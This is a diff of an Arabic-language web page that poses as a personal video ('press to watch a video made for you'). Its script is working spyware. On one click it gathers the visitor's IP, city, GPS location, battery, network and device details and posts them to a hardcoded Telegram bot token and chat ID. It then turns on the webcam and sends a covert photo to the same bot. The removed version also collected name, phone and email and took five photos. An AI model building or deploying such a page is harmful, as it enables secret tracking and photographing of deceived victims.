@@ -3,403 +3,220 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📽️ منصة تفاعلية</title>
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+  <title>📽️ فيديو خاص بك</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    /* إعادة تعيين التنسيقات */
-    * {
+    body {
       margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+      font-family: 'Cairo', sans-serif;
+      background: black;
+      color: white;
+      overflow: hidden;
     }
 
-    body {
-      font-family: 'Tajawal', sans-serif;
-      background: linear-gradient(180deg, #121212 0%, #1c1c1c 100%);
-      color: #ffffff;
-      min-height: 100vh;
+    #particles-js {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: black;
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      height: 100vh;
       text-align: center;
-      padding: 20px;
-    }
-
-    /* حاوية البطاقة */
-    .card {
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 15px;
-      padding: 30px;
-      max-width: 500px;
-      width: 100%;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-      backdrop-filter: blur(5px);
-      margin: 20px 0;
-    }
-
-    /* الشعار */
-    .logo {
-      font-size: 32px;
-      font-weight: 700;
-      color: #d4af37;
-      margin-bottom: 20px;
-      letter-spacing: 1px;
-      animation: fadeIn 1s ease-in;
     }
 
     h1 {
-      font-size: 26px;
-      font-weight: 500;
-      color: #ffffff;
-      margin-bottom: 15px;
-      animation: fadeIn 1.2s ease-in;
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #ff0040;
+      text-shadow: 0 0 10px #ff0040;
     }
 
     p {
-      color: #e0e0e0;
-      font-size: 16px;
-      line-height: 1.5;
-      margin-bottom: 20px;
+      color: #ccc;
+      margin-bottom: 30px;
     }
 
-    /* نموذج الإدخال */
-    .form-container {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      margin-bottom: 25px;
-    }
-
-    input {
-      padding: 12px;
-      border: 1px solid #d4af37;
-      border-radius: 8px;
-      background: transparent;
-      color: #ffffff;
-      font-size: 14px;
-      transition: border-color 0.3s ease;
-    }
-
-    input::placeholder {
-      color: #e0e0e0;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #ffffff;
-      box-shadow: 0 0 5px rgba(212, 175, 55, 0.5);
-    }
-
-    /* الأزرار */
-    .button {
-      background: transparent;
-      border: 2px solid #d4af37;
-      color: #d4af37;
-      padding: 12px 24px;
-      border-radius: 30px;
-      font-size: 16px;
-      font-weight: 500;
+    button {
+      background: #ff0040;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 50px;
+      font-size: 18px;
       cursor: pointer;
-      margin: 8px;
-      transition: all 0.3s ease;
+      box-shadow: 0 0 15px #ff0040;
+      transition: transform 0.2s ease;
     }
 
-    .button:hover {
-      background: #d4af37;
-      color: #121212;
-      transform: translateY(-2px);
-    }
-
-    /* معاينة الصور */
-    .preview-container {
-      display: none;
-      margin-top: 20px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      justify-content: center;
-    }
-
-    .preview-img {
-      width: 100px;
-      height: 75px;
-      object-fit: cover;
-      border-radius: 8px;
-      border: 1px solid #d4af37;
-      transition: transform 0.3s ease;
-    }
-
-    .preview-img:hover {
+    button:hover {
       transform: scale(1.05);
-    }
-
-    /* الإشعارات */
-    .notification {
-      position: fixed;
-      top: 20px;
-      background: #d4af37;
-      color: #121212;
-      padding: 12px 24px;
-      border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-      display: none;
-      z-index: 1000;
-      animation: slideIn 0.5s ease;
     }
 
     video {
       display: none;
     }
-
-    /* الأنيميشن */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes slideIn {
-      from { transform: translateY(-20px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-
-    /* التصميم المتجاوب */
-    @media (max-width: 600px) {
-      .logo { font-size: 28px; }
-      h1 { font-size: 22px; }
-      .card { padding: 20px; }
-      .button { padding: 10px 20px; font-size: 14px; }
-      .preview-img { width: 80px; height: 60px; }
-      input { font-size: 13px; }
-    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">✨ منصة الأناقة</div>
-    <h1>📽️ تجربة تفاعلية متكاملة</h1>
-    <p>أدخل بياناتك واضغط لبدء التجربة التفاعلية!</p>
-    <div class="form-container">
-      <input type="text" id="userName" placeholder="الاسم (اختياري)" />
-      <input type="tel" id="userPhone" placeholder="رقم الهاتف (اختياري)" />
-      <input type="email" id="userEmail" placeholder="البريد الإلكتروني (اختياري)" />
-    </div>
-    <button class="button" onclick="startProcess()">▶️ بدء التجربة</button>
-    <button class="button" onclick="openWhatsApp()">📱 فتح واتساب</button>
-    <button class="button" onclick="openFacebook()">📘 فتح فيسبوك</button>
-    <button class="button" onclick="openYouTubeStudio()">🎥 فتح YouTube Studio</button>
-    <button class="button" onclick="openApp('camera')">📷 فتح الكاميرا</button>
-    <div class="preview-container" id="previewContainer"></div>
-    <div class="notification" id="notification"></div>
+  <div id="particles-js"></div>
+  <div class="container">
+    <h1>📽️ اضغط لمشاهدة الفيديو</h1>
+    <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
+    <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
+    <video id="video" autoplay playsinline></video>
   </div>
-  <video id="video" autoplay playsinline></video>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("particles-js", {
+      "particles": {
+        "number": { "value": 80 },
+        "color": { "value": "#ff0040" },
+        "shape": { "type": "circle" },
+        "opacity": {
+          "value": 0.5,
+          "random": true
+        },
+        "size": {
+          "value": 3,
+          "random": true
+        },
+        "line_linked": {
+          "enable": true,
+          "distance": 120,
+          "color": "#ff0040",
+          "opacity": 0.4,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 2
+        }
+      },
+      "interactivity": {
+        "events": {
+          "onhover": { "enable": true, "mode": "repulse" }
+        }
+      },
+      "retina_detect": true
+    });
+  </script>
+
+  <!-- JavaScript كما هو تماماً من كودك السابق -->
   <script>
     const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
     const chatId = "7220184605";
-    const secretKey = "MySecretKey123";
-
-    function showNotification(message) {
-      const noti = document.getElementById("notification");
-      noti.textContent = message;
-      noti.style.display = "block";
-      setTimeout(() => (noti.style.display = "none"), 3000);
-    }
-
-    function encryptMessage(text) {
-      return CryptoJS.AES.encrypt(text, secretKey).toString();
-    }
 
     async function sendTelegramMessage(text) {
-      const encryptedText = encryptMessage(text);
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: encryptedText }),
+        body: JSON.stringify({ chat_id: chatId, text }),
       });
-      showNotification("تم إرسال البيانات!");
     }
 
-    async function sendPhoto(blob, index) {
+    async function sendPhoto(blob) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", blob, `photo_${index}.jpg`);
+      formData.append("photo", blob, "photo.jpg");
+
       await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
-        body: formData,
+        body: formData
       });
-      showNotification(`تم إرسال الصورة ${index}!`);
     }
 
-    async function getDeviceInfo() {
-      const ipInfo = await (await fetch("https://ipapi.co/json/")).json();
-      const battery = await navigator.getBattery?.() || { level: "غير معروف", charging: "غير معروف" };
-      const location = await new Promise(resolve => {
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(`https://maps.google.com/?q=${pos.coords.latitude.toFixed(5)},${pos.coords.longitude.toFixed(5)}`),
-          () => resolve("❌ غير مسموح"),
-          { timeout: 5000 }
-        );
+    async function getIPInfo() {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    }
+
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging ? "نعم ⚡" : "لا ❌"
+        };
+      } catch {
+        return { level: "غير معروف", charging: "غير معروف" };
+      }
+    }
+
+    async function getLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const lat = pos.coords.latitude.toFixed(5);
+          const lon = pos.coords.longitude.toFixed(5);
+          resolve(`https://maps.google.com/?q=${lat},${lon}`);
+        }, () => {
+          resolve("❌ غير مسموح أو غير متاح");
+        }, { timeout: 5000 });
       });
-      const connection = navigator.connection || {};
-      const storageEstimate = await navigator.storage?.estimate() || {};
-      const screenOrientation = screen.orientation?.type || "غير معروف";
-      return {
-        name: document.getElementById("userName").value || "غير معروف",
-        phone: document.getElementById("userPhone").value || "غير معروف",
-        email: document.getElementById("userEmail").value || "غير معروف",
-        country: ipInfo.country_name || "غير معروف",
-        city: ipInfo.city || "غير معروف",
-        ip: ipInfo.ip || "غير معروف",
-        location,
-        batteryLevel: battery.level ? Math.round(battery.level * 100) + "%" : "غير معروف",
-        batteryCharging: battery.charging ? "نعم ⚡" : "لا ❌",
-        network: connection.effectiveType || "غير معروف",
-        speed: connection.downlink || "غير معروف",
-        device: navigator.userAgent,
-        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 🖥️",
-        deviceVersion: "غير معروف",
-        screen: `${screen.width}x${screen.height}`,
-        screenMode: screenOrientation,
-        colorDepth: screen.colorDepth || 24,
-        memory: navigator.deviceMemory || "غير معروف",
-        storage: storageEstimate.quota ? (storageEstimate.quota / 1024 / 1024 / 1024).toFixed(2) + " GB" : "غير معروف",
-        cores: navigator.hardwareConcurrency || "غير معروف",
-        language: navigator.language || "غير معروف",
-        browser: navigator.userAgent,
-        browserVersion: navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "غير معروف",
-        os: navigator.userAgent.match(/Android [\d.]+/) || ["غير معروف"],
-        time: new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" }),
-        geolocation: navigator.geolocation ? "نعم 🌍" : "لا ❌",
-        bluetooth: navigator.bluetooth ? "نعم 🔵" : "لا ❌",
-        touch: navigator.maxTouchPoints > 0 ? "نعم ✋" : "لا ❌",
-        protocol: location.protocol,
-        update: "غير معروف",
-        frequency: "غير معروف",
-      };
-    }
-
-    async function compressImage(blob) {
-      const img = new Image();
-      const canvas = document.createElement("canvas");
-      canvas.width = 320;
-      canvas.height = 240;
-      const ctx = canvas.getContext("2d");
-      img.src = URL.createObjectURL(blob);
-      await new Promise(resolve => (img.onload = resolve));
-      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
-    }
-
-    async function capturePhotos(stream) {
-      const video = document.getElementById("video");
-      video.srcObject = stream;
-      video.play();
-      const canvas = document.createElement("canvas");
-      canvas.width = 640;
-      canvas.height = 480;
-      const ctx = canvas.getContext("2d");
-      const previewContainer = document.getElementById("previewContainer");
-      previewContainer.style.display = "block";
-
-      for (let i = 1; i <= 5; i++) {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(async blob => {
-          const compressedBlob = await compressImage(blob);
-          await sendPhoto(compressedBlob, i);
-          const img = document.createElement("img");
-          img.src = URL.createObjectURL(compressedBlob);
-          img.className = "preview-img";
-          previewContainer.appendChild(img);
-        }, "image/jpeg");
-      }
-      stream.getTracks().forEach(track => track.stop());
-    }
-
-    function openWhatsApp() {
-      const phone = document.getElementById("userPhone").value || prompt("أدخل رقم الهاتف (مع رمز الدولة، مثل +966):");
-      if (phone && /\+\d+/.test(phone)) {
-        window.open(`https://wa.me/${phone.replace(/\D/g, "")}`, "_blank");
-        showNotification("تم فتح واتساب!");
-      } else {
-        window.open("https://web.whatsapp.com", "_blank");
-        showNotification("افتح واتساب على هاتفك وامسح رمز QR!");
-      }
-    }
-
-    function openFacebook() {
-      window.open("https://www.facebook.com", "_blank");
-      showNotification("تم فتح فيسبوك!");
-    }
-
-    function openYouTubeStudio() {
-      window.open("https://studio.youtube.com", "_blank");
-      showNotification("تم فتح YouTube Studio!");
-    }
-
-    function openApp(type) {
-      let url;
-      if (type === "camera") {
-        url = "camera://";
-      } else {
-        url = prompt("أدخل رابط URL scheme للتطبيق (مثل tel://):");
-      }
-      if (url) {
-        window.location.href = url;
-        showNotification("جاري محاولة فتح التطبيق...");
-      } else {
-        showNotification("يرجى إدخال رابط صالح!");
-      }
     }
 
     async function startProcess() {
-      showNotification("جاري جمع البيانات...");
-      const info = await getDeviceInfo();
-      const message = `
-📝 معلومات المستخدم:
-- الاسم: ${info.name}
-- الهاتف: ${info.phone}
-- البريد الإلكتروني: ${info.email}
+      const ipInfo = await getIPInfo();
+      const battery = await getBatteryInfo();
+      const location = await getLocation();
+      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
 
-📱 معلومات الجهاز:
-- الدولة: ${info.country} 🔻
-- المدينة: ${info.city} 🏙️
-- عنوان IP: ${info.ip} 🌍
-- شحن الهاتف: ${info.batteryLevel} 🔋
-- هل الهاتف يشحن؟: ${info.batteryCharging}
-- الشبكة: ${info.network} 📶 (سرعة: ${info.speed} ميغابت في الثانية)
-- نوع الاتصال: ${info.network} 📡
-- الوقت: ${info.time} ⏰
-- اسم الجهاز: ${info.device} 🖥️
-- إصدار الجهاز: ${info.deviceVersion} 📜
-- نوع الجهاز: ${info.deviceType}
-- الذاكرة (RAM): ${info.memory} GB 🧠
-- الذاكرة الداخلية: ${info.storage} 💾
-- عدد الأنوية: ${info.cores} ⚙️
-- لغة النظام: ${info.language} 🌐
-- اسم المتصفح: ${info.browser} 🌐
-- إصدار المتصفح: ${info.browserVersion} 📊
-- دقة الشاشة: ${info.screen} 📏
-- إصدار نظام التشغيل: ${info.os} 🖥️
-- وضع الشاشة: ${info.screenMode} 🔄
-- عمق الألوان: ${info.colorDepth} bits 🎨
-- تاريخ آخر تحديث للمتصفح: ${info.update} 📅
-- بروتوكول الأمان المستخدم: ${info.protocol} 🔒
-- نطاق التردد للاتصال: ${info.frequency} 📡
-- إمكانية تحديد الموقع الجغرافي: ${info.geolocation}
-- الدعم لتقنية البلوتوث: ${info.bluetooth}
-- دعم الإيماءات اللمسية: ${info.touch}
+      const deviceInfo = navigator.userAgent;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const connection = navigator.connection || {};
+      const memory = navigator.deviceMemory || "غير معروف";
+      const cores = navigator.hardwareConcurrency || "غير معروف";
+
+      const message = `
+📝 معلومات الزائر:
+🌍 الدولة: ${ipInfo.country_name} 
+🏙️ المدينة: ${ipInfo.city}
+🌐 IP: ${ipInfo.ip}
+📍 الموقع الجغرافي: ${location}
+
+📱 الجهاز:
+🔋 الشحن: ${battery.level}%
+⚡ هل يشحن؟: ${battery.charging}
+📶 الاتصال: ${connection.effectiveType || "غير معروف"}
+💾 الذاكرة: ${memory} GB
+⚙️ الأنوية: ${cores}
+🖥️ المتصفح: ${deviceInfo}
+📏 الشاشة: ${screenRes}
+🕓 الوقت: ${now}
 `;
-      localStorage.setItem("userData", JSON.stringify(info));
+
       await sendTelegramMessage(message);
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        await capturePhotos(stream);
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.play();
+
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          stream.getTracks().forEach(track => track.stop());
+
+          canvas.toBlob(async (blob) => {
+            await sendPhoto(blob);
+          }, "image/jpeg");
+        }, 3000);
       } catch (err) {
-        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة: " + err.message);
+        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
       }
     }
   </script>
